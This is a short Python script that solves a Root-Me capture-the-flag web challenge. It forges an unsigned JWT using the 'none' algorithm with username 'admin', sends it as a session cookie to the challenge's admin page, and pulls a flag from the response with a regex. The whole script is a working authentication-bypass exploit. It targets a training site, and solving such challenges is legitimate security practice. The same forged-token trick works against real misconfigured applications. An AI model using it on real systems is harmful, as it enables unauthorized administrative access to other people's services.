import requests, jwt, re

"""
https://www.codegrepper.com/code-examples/python/python+requests+cookies+session
https://jwt.io/
"""

host = "http://challenge01.root-me.org/web-serveur/ch58/index.php?admin"
session = requests.session()

cookie = jwt.encode({'username':'admin'},'',algorithm='none')
session.cookies.set("jwt", cookie)

response = session.get(host).text

flag = re.findall("[a-zA-Z0-9_]{35}", response)
print(flag[0]) if flag else print("Echec de recuperation du flag sur " + host)
